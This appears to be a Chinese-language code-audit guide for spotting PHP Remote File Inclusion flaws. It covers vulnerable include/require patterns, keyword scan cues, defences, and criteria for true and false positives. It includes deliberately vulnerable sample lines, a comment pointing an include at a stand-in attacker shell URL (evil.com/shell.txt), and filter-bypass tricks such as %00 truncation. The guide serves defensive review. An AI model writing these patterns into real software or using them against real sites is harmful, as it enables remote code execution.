# PHP Remote URL Inclusion (RFI)

## 漏洞成因
当 `allow_url_include=On` 时，PHP 文件包含函数（`include`/`require`/`include_once`/`require_once`）可加载远程 URL 资源，若参数可控则导致任意远程代码执行。

## Details

### 代码示例
```php
// 典型 RFI 漏洞
include($_GET['page'] . '.php');
require($user_input);
include_once('modules/' . $_REQUEST['module']);

// 伪协议触发
include($_GET['file']); // http://evil.com/shell.txt
require('lang/' . $_POST['lang']); // php://input
```

### 快速定位核心操作 (L1 - 关键词扫描)
- **函数签名**：`include`、`require`、`include_once`、`require_once`
- **危险组合**：包含函数 + `$_GET`/`$_POST`/`$_REQUEST`/`$_COOKIE`
- **伪协议**：`http://`、`https://`、`ftp://`、`php://`、`data://`、`expect://`
- **字符串拼接**：动态路径构造（如 `'path/' . $var`）
- **配置依赖**：搜索 `allow_url_include`、`allow_url_fopen` 配置检查

### 快速定位保护机制 (L2 - 跳读)
- **白名单验证**：`in_array($input, ['home', 'about'])`、预定义模块数组
- **路径限制**：`basename()`、`realpath()` 限制目录范围
- **协议过滤**：`parse_url()` 检查 scheme、正则拒绝 `://` 或 `php://`
- **扩展名强制**：硬编码后缀（如 `.php`）但需注意截断绕过（`%00`）
- **配置检查**：代码中检查 `ini_get('allow_url_include')`
- **输入清洗**：`filter_var($url, FILTER_VALIDATE_URL)` 配合黑名单

## Classify

### 真实漏洞
- 用户输入直接或经简单拼接后进入包含函数，且 `allow_url_include=On`
- 验证逻辑存在逻辑缺陷（如黑名单不完整、大小写绕过、编码绕过）
- 使用 `strpos` 等弱校验（如仅检查是否包含 `.php` 但可构造 `.php.evil.com`）

### 误报
- 参数来源于服务器端配置文件或数据库常量（非用户可控）
- 严格白名单验证且白名单不可被污染（如硬编码数组）
- `allow_url_include=Off` 且无伪协议利用可能（需确认配置）
- 包含路径前缀固定为本地绝对路径（如 `/var/www/modules/`）且输入仅为文件名

### 代码异味
- 使用部分黑名单过滤（存在绕过风险但未完全验证）
- 包含逻辑复杂，需跨多个函数追踪才能确定输入流向
- 配置动态可变（如通过 `ini_set` 修改 `allow_url_include`）

## Low risk

### 低风险场景
- `allow_url_include=Off` 但 `allow_url_fopen=On`：仅影响文件读取类函数（`file_get_contents`），不影响代码执行类包含函数
- 包含点位于管理后台且需要高权限认证（如 admin 角色）
- 输入经过多层验证，仅存在理论绕过可能但实际利用难度极高
- 包含文件路径前缀为网络隔离环境（如仅能访问内网资源且内网受控）
- WAF 或 IDS 已部署针对性规则拦截常见 RFI 特征（如 `http://`、伪协议）
- 错误配置但应用生命周期即将结束，且已有替代方案部署计划